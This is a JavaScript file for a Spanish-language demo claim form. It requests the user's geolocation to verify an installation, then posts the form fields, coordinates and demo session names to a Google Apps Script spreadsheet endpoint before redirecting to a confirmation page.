const SHEETS_ENDPOINT = "https://script.google.com/macros/s/AKfycbyUlld6zm9GdN_geYkLLulje2_eu_7AIr20MdMpAfahlx_v_wRutMi2sVt_AGZeP9MsoA/exec"; // pega tu /exec

const verifyBtn = document.getElementById("verifyBtn");
const geoStatus = document.getElementById("geoStatus");
const verifyIcon = document.getElementById("verifyIcon");
const form = document.getElementById("claimForm");
const hello = document.getElementById("hello");

let geoPayload = null;

function setVerifyIcon(type) {
  if (!verifyIcon) return;
  if (type === "ok") {
    verifyIcon.src = "img/correcto.png";
    verifyIcon.alt = "Verificación correcta";
    verifyIcon.style.display = "inline-block";
  } else if (type === "deny") {
    verifyIcon.src = "img/denegado.png";
    verifyIcon.alt = "Acceso denegado";
    verifyIcon.style.display = "inline-block";
  } else {
    verifyIcon.src = "";
    verifyIcon.alt = "";
    verifyIcon.style.display = "none";
  }
}

// Mostrar sesión demo
let session = null;
try {
  const rawSession = localStorage.getItem("icss_demo_session");
  session = rawSession ? JSON.parse(rawSession) : null;
  if (hello) {
    const name = session?.demoNick || session?.demoUser || "Usuario";
    hello.textContent = `Hola, ${name} (demo)`;
  }
} catch {
  session = null;
  if (hello) hello.textContent = "Sesión demo inválida.";
}

// Verificación ubicación (demo)
verifyBtn?.addEventListener("click", () => {
  geoStatus.textContent = "Verificando instalación…";
  setVerifyIcon(null);

  if (!("geolocation" in navigator)) {
    geoPayload = null;
    geoStatus.textContent = "Este navegador no soporta geolocalización.";
    setVerifyIcon("deny");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      geoPayload = {
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy_m: pos.coords.accuracy,
        ts: Date.now()
      };
      geoStatus.textContent =
        `Instalación verificada (demo): ${geoPayload.lat.toFixed(5)}, ${geoPayload.lng.toFixed(5)} · ±${Math.round(geoPayload.accuracy_m)}m`;
      setVerifyIcon("ok");
    },
    () => {
      geoPayload = null;
      geoStatus.textContent = "Permiso de ubicación denegado.";
      setVerifyIcon("deny");
    },
    { enableHighAccuracy: true, timeout: 10000 }
  );
});

// Guardar + enviar a Sheets + redirigir
form?.addEventListener("submit", async (e) => {
  e.preventDefault();

  const data = Object.fromEntries(new FormData(form).entries());

  const payload = {
    ...data,
    // geo se manda plano para Apps Script (más fácil)
    geo_lat: geoPayload?.lat ?? "",
    geo_lng: geoPayload?.lng ?? "",
    geo_accuracy: geoPayload?.accuracy_m ?? "",
    demoUser: session?.demoUser ?? "",
    demoNick: session?.demoNick ?? "",
    savedAt: new Date().toISOString()
  };

  // Guardar local (backup demo)
  localStorage.setItem("icss_claim_data", JSON.stringify(payload));

  // Enviar a Google Sheets como form-url (evita preflight CORS)
  try {
    const body = new URLSearchParams(payload);
    await fetch(SHEETS_ENDPOINT, { method: "POST", body });
  } catch (err) {
    console.warn("No se pudo enviar a Sheets:", err);
  }

  window.location.href = "enviado.html";
});
